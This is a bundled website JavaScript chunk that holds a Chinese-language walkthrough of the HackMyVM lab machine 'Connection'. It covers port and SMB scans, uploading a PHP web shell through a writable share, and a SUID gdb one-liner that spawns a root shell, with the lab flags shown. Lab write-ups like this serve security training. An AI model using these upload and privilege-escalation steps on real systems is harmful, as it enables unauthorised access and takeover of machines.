"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2593],{4724:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>p,frontMatter:()=>c,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"HackMyVm/Machines/Connection","title":"Connection","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/HackMyVm/Machines/Connection.md","sourceDirName":"HackMyVm/Machines","slug":"/HackMyVm/Machines/Connection","permalink":"/docs/HackMyVm/Machines/Connection","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Machines/Connection.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"BaseMe","permalink":"/docs/HackMyVm/Machines/BaseMe"},"next":{"title":"Flower","permalink":"/docs/HackMyVm/Machines/Flower"}}');var a=s(4848),t=s(8453);const c={},i=void 0,o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:3},{value:"SMB\u670d\u52a1\u6e17\u900f",id:"smb\u670d\u52a1\u6e17\u900f",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"gdb\u63d0\u6743",id:"gdb\u63d0\u6743",level:4}];function d(e){const n={code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nmap -sT --min-rate 10000 -p- 192.168.56.113\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 01:33 EDT\r\nNmap scan report for 192.168.56.113\r\nHost is up (0.00072s latency).\r\nNot shown: 65531 closed tcp ports (conn-refused)\r\nPORT    STATE SERVICE\r\n22/tcp  open  ssh\r\n80/tcp  open  http\r\n139/tcp open  netbios-ssn\r\n445/tcp open  microsoft-ds\r\nMAC Address: 08:00:27:AF:CC:26 (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nmap -sT -sC -sV -O -p22,80,139,445 192.168.56.113\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"PORT    STATE SERVICE     VERSION\r\n22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)\r\n|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)\r\n|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)\r\n80/tcp  open  http        Apache httpd 2.4.38 ((Debian))\r\n|_http-server-header: Apache/2.4.38 (Debian)\r\n|_http-title: Apache2 Debian Default Page: It works\r\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\r\nMAC Address: 08:00:27:AF:CC:26 (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 4.X|5.X\r\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\r\nOS details: Linux 4.15 - 5.8\r\nNetwork Distance: 1 hop\r\nService Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n| smb-os-discovery: \r\n|   OS: Windows 6.1 (Samba 4.9.5-Debian)\r\n|   Computer name: connection\r\n|   NetBIOS computer name: CONNECTION\\x00\r\n|   Domain name: \\x00\r\n|   FQDN: connection\r\n|_  System time: 2024-10-13T01:34:58-04:00\r\n|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s\r\n| smb2-time: \r\n|   date: 2024-10-13T05:34:58\r\n|_  start_date: N/A\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled but not required\r\n|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\r\n| smb-security-mode: \r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,a.jsx)(n.p,{children:"\u65e0\u6536\u83b7"}),"\n",(0,a.jsx)(n.h3,{id:"smb\u670d\u52a1\u6e17\u900f",children:"SMB\u670d\u52a1\u6e17\u900f"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"smbmap -H 192.168.56.113\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"[*] Detected 1 hosts serving SMB\r\n[*] Established 1 SMB session(s)                                \r\n                                                                                                    \r\n[+] IP: 192.168.56.113:445      Name: 192.168.56.113            Status: Authenticated\r\n        Disk                                                    Permissions     Comment\r\n        ----                                                    -----------     -------\r\n        share                                                   READ ONLY\r\n        print$                                                  NO ACCESS       Printer Drivers\r\n        IPC$                                                    NO ACCESS       IPC Service (Private Share for uploading files)\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"share"}),"\u6587\u4ef6\u53ea\u8bfb"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"smbclient //192.168.56.113/share\r\nsmbclient -N \\\\\\\\192.168.56.113\\\\share\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u9700\u8981\u5bf9",(0,a.jsx)(n.code,{children:"\\"}),"\u8fdb\u884c\u8f6c\u4e49"]}),"\n",(0,a.jsxs)(n.p,{children:["\u8fdb\u5165\u5230web\u76ee\u5f55\u3002\u5229\u7528",(0,a.jsx)(n.code,{children:"put"}),"\u4e0a\u4f20shell"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"smb: \\html\\> put 1.php\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013143506298.png",alt:"image-20241013143506298"})}),"\n",(0,a.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,a.jsx)(n.p,{children:"user\u2018s flag"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@connection:/home/connection$ cat local.txt                                             3f491443a2a6aa82bc86a3cda8c39617\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@connection:/home/connection$ find / -type f -perm -4000 2>/dev/null\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/bin/newgrp\r\n/usr/bin/umount\r\n/usr/bin/su\r\n/usr/bin/passwd\r\n/usr/bin/gdb\r\n/usr/bin/chsh\r\n/usr/bin/chfn\r\n/usr/bin/mount\r\n/usr/bin/gpasswd\n"})}),"\n",(0,a.jsx)(n.h4,{id:"gdb\u63d0\u6743",children:"gdb\u63d0\u6743"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013143723876.png",alt:"image-20241013143723876"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:' gdb -nx -ex \'python import os; os.execl("/bin/bash", "bash", "-p")\' -ex quit\n'})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) root@connection:/root# cat proof.txt \r\na7c6ea4931ab86fb54c5400204474a39\n"})})]})}function p(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>i});var r=s(6540);const a={},t=r.createContext(a);function c(e){const n=r.useContext(t);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:c(e.components),r.createElement(t.Provider,{value:n},e.children)}}}]);